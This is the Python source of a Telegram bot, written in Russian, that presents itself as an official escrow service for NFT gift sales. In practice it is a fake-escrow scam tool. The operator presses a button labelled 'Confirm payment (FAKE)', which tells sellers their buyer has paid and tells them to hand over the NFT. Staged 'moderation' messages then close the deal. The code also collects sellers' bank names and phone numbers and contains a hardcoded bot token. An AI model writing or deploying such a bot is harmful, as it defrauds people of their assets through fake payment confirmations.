import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton, ReplyKeyboardMarkup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "9185641906:AAHDMFMjBCRqN24BjGHW26DZW_J6FHyD1ec"
ADMIN_ID = 7532797597  
# ============================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

active_deals = {}

class CreateDeal(StatesGroup):
    bank_name = State()
    phone = State()
    amount = State()
    nft_link = State()

# --- МЕНЮ ---
def user_menu():
    # Обычные юзеры видят ТОЛЬКО эту кнопку
    kb = [[KeyboardButton(text="🤝 Создать сделку")]]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def admin_menu():
    # Только ты видишь админ-панель
    kb = [
        [KeyboardButton(text="🤝 Создать сделку")],
        [KeyboardButton(text="🛡 Админ-панель")] 
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

# --- СТАРТ ---
@dp.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("Добро пожаловать, Администратор 🛡\nВыберите действие:", reply_markup=admin_menu())
    else:
        await message.answer("Добро пожаловать 👋\nЭто официальный сервис безопасных сделок.\nВыберите действие:", reply_markup=user_menu())

# --- 1. СОЗДАНИЕ СДЕЛКИ ---
@dp.message(F.text == "🤝 Создать сделку")
async def create_deal_start(message: Message, state: FSMContext):
    await state.set_state(CreateDeal.bank_name)
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🟢 Сбербанк", callback_data="bank_Сбербанк"),
         InlineKeyboardButton(text="🟡 Т-Банк", callback_data="bank_Т-Банк")],
        [InlineKeyboardButton(text="🔵 Альфа-Банк", callback_data="bank_Альфа-Банк"),
         InlineKeyboardButton(text="🟣 ВТБ", callback_data="bank_ВТБ")],
        [InlineKeyboardButton(text="🟠 Райффайзен", callback_data="bank_Райффайзен"),
         InlineKeyboardButton(text="⚫ Другой банк", callback_data="bank_Другой")]
    ])
    
    await message.answer(
        "🏦 <b>Шаг 1 из 4</b>\n\n"
        "Пожалуйста, выберите ваш банк из списка ниже:",
        parse_mode="HTML",
        reply_markup=kb
    )

@dp.callback_query(F.data.startswith("bank_"), CreateDeal.bank_name)
async def process_bank_choice(call: CallbackQuery, state: FSMContext):
    bank_name = call.data.split("_")[1]
    
    if bank_name == "Другой":
        await call.message.edit_text("🏦 <b>Шаг 1 из 4</b>\n\nНапишите название вашего банка текстом:", parse_mode="HTML")
    else:
        await state.update_data(bank_name=bank_name)
        await state.set_state(CreateDeal.phone)
        await call.message.edit_text(
            f"✅ Выбран банк: <b>{bank_name}</b>\n\n"
            f"📱 <b>Шаг 2 из 4</b>\n\nВведите ваш номер телефона (привязанный к карте):",
            parse_mode="HTML"
        )
    await call.answer()

@dp.message(CreateDeal.bank_name)
async def process_custom_bank(message: Message, state: FSMContext):
    await state.update_data(bank_name=message.text)
    await state.set_state(CreateDeal.phone)
    await message.answer(f"✅ Банк: <b>{message.text}</b>\n\n📱 <b>Шаг 2 из 4</b>\n\nВведите ваш номер телефона:", parse_mode="HTML")

@dp.message(CreateDeal.phone)
async def process_phone(message: Message, state: FSMContext):
    await state.update_data(phone=message.text)
    await state.set_state(CreateDeal.amount)
    await message.answer("💰 <b>Шаг 3 из 4</b>\n\nВведите сумму сделки (только целое число, например: 1000):", parse_mode="HTML")

@dp.message(CreateDeal.amount)
async def process_amount(message: Message, state: FSMContext):
    try:
        amount = int(message.text)
    except ValueError:
        return await message.answer("❌ Пожалуйста, введите сумму целым числом (без точек и копеек).")
    
    await state.update_data(amount=amount)
    await state.set_state(CreateDeal.nft_link)
    await message.answer("🖼 <b>Шаг 4 из 4</b>\n\nОтправьте ссылку на ваш NFT (подарок):", parse_mode="HTML")

@dp.message(CreateDeal.nft_link)
async def process_nft(message: Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    
    deal_id = str(message.from_user.id)
    active_deals[deal_id] = {
        "seller_id": message.from_user.id,
        "seller_name": message.from_user.username or message.from_user.first_name,
        "buyer_id": None,
        "bank_name": data["bank_name"],
        "phone": data["phone"],
        "amount": data["amount"],
        "nft_link": message.text,
        "status": "pending_admin_confirm"
    }
    
    bot_info = await bot.get_me()
    pay_link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
    
    await message.answer(
        f"✅ <b>Сделка создана!</b>\n\n"
        f"Сумма: {data['amount']} RUB\n"
        f"Банк: {data['bank_name']}\n"
        f"Товар: {message.text}\n\n"
        f"<b>Ссылка для покупателя:</b>\n<code>{pay_link}</code>\n\n"
        f"<i>Отправьте эту ссылку покупателю, чтобы он смог безопасно оплатить.</i>",
        parse_mode="HTML"
    )
    
    # ТОЛЬКО ТЕБЕ
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить оплату (ФЕЙК)", callback_data=f"admin_confirm_{deal_id}")]
    ])
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🛡 <b>АДМИН-ПАНЕЛЬ: НОВАЯ СДЕЛКА</b>\n\n"
             f"👤 Продавец: @{active_deals[deal_id]['seller_name']}\n"
             f"💰 Сумма: {data['amount']} RUB\n"
             f"🏦 Банк: {data['bank_name']}\n"
             f"📱 Тел: {data['phone']}\n"
             f"🖼 NFT: {message.text}\n\n"
             f"<b>Нажмите кнопку, чтобы подтвердить оплату.</b>",
        parse_mode="HTML",
        reply_markup=admin_kb
    )

# --- 2. ПОКУПАТЕЛЬ ОТКРЫВАЕТ СДЕЛКУ ---
@dp.message(Command("start"), F.text.contains("deal_"))
async def start_deal_by_link(message: Message):
    try:
        deal_id = message.text.split("deal_")[1]
        deal = active_deals.get(deal_id)
        
        if not deal:
            return await message.answer("❌ Сделка не найдена или уже завершена.")
            
        deal["buyer_id"] = message.from_user.id
        
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💸 Я оплатил", callback_data=f"pay_{deal_id}")]
        ])
        
        await message.answer(
            f"🛒 <b>Безопасная сделка</b>\n\n"
            f"Продавец: @{deal['seller_name']}\n"
            f"Сумма: {deal['amount']} RUB\n"
            f"Товар: {deal['nft_link']}\n\n"
            f"<b>Реквизиты для оплаты:</b>\n"
            f"Банк: {deal['bank_name']}\n"
            f"Телефон: <code>{deal['phone']}</code>\n\n"
            f"Переведите средства и нажмите кнопку ниже.",
            parse_mode="HTML",
            reply_markup=kb
        )
        
        try:
            await bot.send_message(deal["seller_id"], f"🔔 <b>Покупатель присоединился к сделке!</b>\nОжидайте подтверждения оплаты.", parse_mode="HTML")
        except: pass
        
    except Exception:
        await message.answer("Ошибка при открытии сделки.")

# --- 3. ПОКУПАТЕЛЬ НАЖАЛ "Я ОПЛАТИЛ" ---
@dp.callback_query(F.data.startswith("pay_"))
async def buyer_paid(call: CallbackQuery):
    deal_id = call.data.split("_")[1]
    deal = active_deals.get(deal_id)
    
    if not deal:
        return await call.answer("Сделка не найдена.", show_alert=True)
    
    deal["status"] = "awaiting_confirm"
    await call.message.edit_text("⏳ Ожидайте подтверждения оплаты администратором...")
    
    # ТОЛЬКО ТЕБЕ
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить оплату (ФЕЙК)", callback_data=f"admin_confirm_{deal_id}")]
    ])
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🛡 <b>ПОКУПАТЕЛЬ НАЖАЛ 'ОПЛАТИЛ'!</b>\n\n"
             f"👤 Покупатель: @{call.from_user.username}\n"
             f"💰 Сумма: {deal['amount']} RUB\n\n"
             f"<b>Нажмите кнопку, чтобы разослать подтверждение.</b>",
        parse_mode="HTML",
        reply_markup=admin_kb
    )

# --- 4. ТЫ (АДМИН) ПОДТВЕРЖДАЕШЬ ОПЛАТУ ---
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    # Защита: если нажал не ты, просто игнорируем
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⚠️ Сделка уже обрабатывается.", show_alert=False)
    
    deal_id = call.data.split("_")[2]
    deal = active_deals.get(deal_id)
    
    if not deal:
        return await call.answer("Сделка не найдена", show_alert=False)
    
    deal["status"] = "paid"
    await call.message.edit_text(f"✅ Вы подтвердили оплату по сделке с @{deal['seller_name']}.")
    
    seller_text = (
        f"🛡 <b>СИСТЕМА БЕЗОПАСНЫХ СДЕЛОК</b>\n\n"
        f"✅ <b>Оплата по сделке успешно подтверждена!</b>\n\n"
        f"📄 <b>Детали:</b>\n"
        f"├ Сумма: <b>{deal['amount']} RUB</b>\n"
        f"└ Товар: {deal['nft_link']}\n\n"
        f"⚠️ <b>Инструкция для Продавца:</b>\n"
        f"Покупатель успешно перевел средства. <b>Передайте указанный NFT напрямую покупателю.</b>\n\n"
        f"<i>После передачи нажмите кнопку ниже.</i>"
    )
    
    seller_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 Я передал NFT", callback_data=f"seller_done_{deal_id}")]
    ])
    
    try:
        await bot.send_message(deal["seller_id"], seller_text, parse_mode="HTML", reply_markup=seller_kb)
    except: pass
        
    if deal["buyer_id"]:
        try:
            await bot.send_message(deal["buyer_id"], f"✅ <b>Оплата подтверждена!</b>\nОжидайте получения NFT от продавца.", parse_mode="HTML")
        except: pass

# --- 5. ПРОДАВЕЦ НАЖАЛ "Я ПЕРЕДАЛ NFT" ---
@dp.callback_query(F.data.startswith("seller_done_"))
async def seller_done(call: CallbackQuery):
    deal_id = call.data.split("_")[2]
    deal = active_deals.get(deal_id)
    
    if not deal:
        return await call.answer("Сделка не найдена.", show_alert=False)
    
    deal["status"] = "pending_nft_confirm"
    
    await call.message.edit_text(
        f"⏳ <b>Заявка на завершение сделки принята!</b>\n\n"
        f"🛡 <b>Система безопасности:</b>\n"
        f"├ Статус: <i>Передано в отдел модерации</i>\n"
        f"├ Проверка транзакции: <i>В процессе...</i>\n"
        f"└ Ожидаемое время: <i>до 15 минут</i>\n\n"
        f"<i>Наш алгоритм проверяет историю передачи подарка и статус аккаунтов. Как только модерация подтвердит передачу NFT, вы и покупатель получите официальное уведомление.</i>",
        parse_mode="HTML"
    )
    
    # ТОЛЬКО ТЕБЕ
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить передачу NFT", callback_data=f"admin_confirm_nft_{deal_id}")]
    ])
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🛡 <b>АДМИН-ПАНЕЛЬ: ЗАПРОС НА МОДЕРАЦИЮ</b>\n\n"
             f"👤 Продавец: @{deal['seller_name']}\n"
             f"💰 Сумма: {deal['amount']} RUB\n"
             f"🖼 NFT: {deal['nft_link']}\n\n"
             f"Продавец заявил о передаче NFT.\n"
             f"<b>Нажмите кнопку ниже, чтобы закрыть сделку.</b>",
        parse_mode="HTML",
        reply_markup=admin_kb
    )

# --- 6. ТЫ (АДМИН) ПОДТВЕРЖДАЕШЬ ПЕРЕДАЧУ NFT ---
@dp.callback_query(F.data.startswith("admin_confirm_nft_"))
async def admin_confirm_nft(call: CallbackQuery):
    # Защита
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⚠️ Сделка уже обрабатывается.", show_alert=False)
    
    deal_id = call.data.split("_")[3]
    deal = active_deals.get(deal_id)
    
    if not deal:
        return await call.answer("Сделка не найдена", show_alert=False)
    
    deal["status"] = "completed"
    await call.message.edit_text(f"✅ Модерация пройдена. Сделка с @{deal['seller_name']} успешно закрыта.")
    
    try:
        await bot.send_message(
            deal["seller_id"], 
            f"🛡 <b>СИСТЕМА БЕЗОПАСНЫХ СДЕЛОК</b>\n\n"
            f"✅ <b>Модерация успешно завершена!</b>\n\n"
            f"Передача NFT подтверждена. Сделка закрыта.\n"
            f"Средства ({deal['amount']} RUB) разблокированы и зачислены на ваши реквизиты (демо-режим).\n\n"
            f"<i>Спасибо за использование нашего сервиса!</i>", 
            parse_mode="HTML"
        )
    except: pass
    
    if deal["buyer_id"]:
        try:
            await bot.send_message(
                deal["buyer_id"], 
                f"🎉 <b>Сделка успешно завершена!</b>\n\n"
                f"🛡 <b>Система безопасности подтвердила передачу NFT.</b>\n"
                f"Пожалуйста, проверьте ваш кошелек/подарки. Спасибо, что доверяете нам!", 
                parse_mode="HTML"
            )
        except: pass

async def main():
    print("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
